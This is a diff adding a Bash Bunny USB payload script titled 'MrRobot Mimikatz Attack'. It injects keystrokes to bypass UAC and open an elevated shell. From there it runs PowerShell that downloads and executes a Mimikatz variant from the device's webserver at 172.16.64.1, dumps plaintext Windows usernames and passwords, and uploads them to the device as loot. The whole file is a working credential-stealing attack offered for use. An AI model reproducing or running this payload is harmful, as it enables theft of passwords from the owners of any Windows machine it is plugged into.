@@ -1,0 +1,78 @@
+#!/bin/bash
+#
+# Title:         MrRobot Mimikatz Attack
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the usernames & plaintext passwords from Windows boxes using Powershell in memory
+# with Mimikatz then stashes them in /root/udisk/loot/MrRobot
+#
+# Amber..............Starting WebServer
+# Blue...............Running Powershell / Waiting for WebServer to start
+# White..............WebServer started and Uploading Results
+# Purple.............Checking for Results
+# Green..............Got Creds and copied to loot folder
+# Red................No Creds
+
+source bunny_helpers.sh
+
+LED R G 200
+LOOTDIR=/root/udisk/loot/MrRobot
+mkdir -p $LOOTDIR
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+mkdir -p $SWITCHDIR/loot
+
+
+# HID Attack Starts
+ATTACKMODE HID
+LED B 200
+
+# UAC Bypass
+Q GUI
+Q DELAY 500
+Q STRING CMD
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 1500
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 1200
+
+#Powershell Payload: first wait for connection to bunny webserver, then pull scripts and upload results
+Q STRING powershell -c \"while \(\$true\) \{ If \(Test-Connection 172.16.64.1 -count 1 -quiet\) \{ sleep 2\; exit\"\}\}
+Q DELAY 300
+Q ENTER
+Q STRING powershell -NoP -Exec Bypass -c \"sleep 2\;IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\172.16.64.1\/md.ps1\'\)\;
+Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/\'\+\$env:computername\, \$o\)\;
+Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/EOF\'\, \'EOF\'\)\;\"
+Q DELAY 300
+Q ENTER
+Q STRING exit
+Q ENTER
+
+# Ethernet Attack Starts
+ATTACKMODE RNDIS_ETHERNET
+source bunny_helpers.sh
+
+LED R G B 200
+# mount -o sync /dev/nandf /root/udisk
+
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python $SWITCHDIR/server.py
+
+
+#Wait for EOF in loot folder
+LED R B 200
+while [ ! -e  "$SWITCHDIR/loot/EOF" ]; do sleep 1; done;
+sleep 1
+
+# check for empty loot directory
+if [ "$(ls -A $SWITCHDIR/loot/)" ]; then
+     mv -v $SWITCHDIR/loot/*.txt $LOOTDIR
+     rm -rf $SWITCHDIR/loot/
+     LED G
+else
+     rm-rf $SWITCHDIR/loot/
+     LED R
+fi
